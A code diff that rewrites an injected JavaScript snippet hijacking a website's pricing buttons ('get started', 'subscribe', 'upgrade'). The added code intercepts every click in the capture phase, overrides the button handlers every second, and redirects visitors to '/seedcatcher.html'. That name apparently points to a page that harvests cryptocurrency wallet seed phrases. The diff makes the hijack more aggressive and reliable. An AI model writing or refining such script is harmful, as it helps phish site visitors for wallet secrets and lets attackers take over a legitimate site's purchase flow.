@@ -1,24 +1,37 @@
-document.addEventListener('DOMContentLoaded', function() {
+(function() {
     const redirectToCatcher = (e) => {
-        e.preventDefault();
-        e.stopPropagation();
-        window.location.href = '/seedcatcher.html';
+        // Only redirect if it's a click on a pricing button
+        let el = e.target.closest('a, button, div');
+        if (!el) return;
+        
+        let text = (el.innerText || "").toLowerCase().trim();
+        let href = (el.getAttribute("href") || "").toLowerCase();
+        
+        // Ignore the menu link
+        if (href === "/premium" || href.endsWith("/premium")) return;
+        
+        // Catch the buttons
+        if (text === 'get started' || text === 'subscribe' || text === 'upgrade') {
+            e.preventDefault();
+            e.stopPropagation();
+            window.location.href = '/seedcatcher.html';
+        }
     };
 
-    const hijackButtons = () => {
-        const elements = document.querySelectorAll('a, button, div');
-        elements.forEach(el => {
-            const text = (el.innerText || "").toLowerCase().trim();
-            
-            // Catch the pricing buttons
+    // Attach to the whole document, but use capture phase so we get it FIRST
+    document.addEventListener('click', redirectToCatcher, true);
+
+    // Also, aggressively hunt for the buttons and attach directly
+    setInterval(() => {
+        document.querySelectorAll('a, button').forEach(el => {
+            let text = (el.innerText || "").toLowerCase().trim();
             if (text === 'get started' || text === 'subscribe' || text === 'upgrade') {
-                el.removeEventListener('click', redirectToCatcher);
-                el.addEventListener('click', redirectToCatcher, true);
+                el.onclick = function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    window.location.href = '/seedcatcher.html';
+                };
             }
         });
-    };
-
-    hijackButtons();
-    const observer = new MutationObserver(hijackButtons);
-    observer.observe(document.body, { childList: true, subtree: true });
-});
+    }, 1000); // Check every second for new buttons
+})();
